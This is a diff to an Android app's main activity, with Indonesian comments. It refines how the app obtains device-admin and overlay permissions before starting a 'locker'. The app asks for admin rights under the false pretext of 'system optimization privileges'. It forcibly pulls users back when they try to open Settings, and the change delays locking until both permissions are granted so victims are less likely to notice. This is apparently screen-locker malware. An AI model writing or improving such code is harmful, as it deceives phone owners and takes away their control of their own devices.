@@ -12,6 +12,7 @@ import android.provider.Settings;
 public class MainActivity extends Activity {
 
     private static final int ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE = 5469;
+    private static final int ACTION_DEVICE_ADMIN_REQUEST_CODE = 1001;
     private DevicePolicyManager devicePolicyManager;
     private ComponentName adminComponent;
 
@@ -30,18 +31,21 @@ public class MainActivity extends Activity {
             Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
             intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
             intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "This app requires system optimization privileges.");
-            startActivity(intent);
+            startActivityForResult(intent, ACTION_DEVICE_ADMIN_REQUEST_CODE);
+        } else {
+            // Jika Admin sudah aktif, baru cek izin overlay
+            checkPermission();
         }
-
-        // Cek izin draw overlay (diperlukan untuk TYPE_APPLICATION_OVERLAY)
-        checkPermission();
     }
 
     @Override
     public void onWindowFocusChanged(boolean hasFocus) {
         super.onWindowFocusChanged(hasFocus);
-        if (!hasFocus) {
-            // Jika user mencoba buka Settings lewat glitch, tarik paksa kembali
+        // Hanya tarik paksa kembali jika izin SUDAH lengkap semua
+        // Jika masih dalam proses minta izin, jangan di-lock dulu
+        if (!hasFocus && 
+            devicePolicyManager.isAdminActive(adminComponent) && 
+            Settings.canDrawOverlays(this)) {
             startLocker();
         }
     }
@@ -67,7 +71,13 @@ public class MainActivity extends Activity {
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE) {
+        
+        if (requestCode == ACTION_DEVICE_ADMIN_REQUEST_CODE) {
+            // Setelah kembali dari request Admin, baru cek/minta Overlay
+            checkPermission();
+        } 
+        else if (requestCode == ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE) {
+            // Setelah kembali dari Overlay, baru nyalakan loker
             if (Settings.canDrawOverlays(this)) {
                 startLocker();
             }
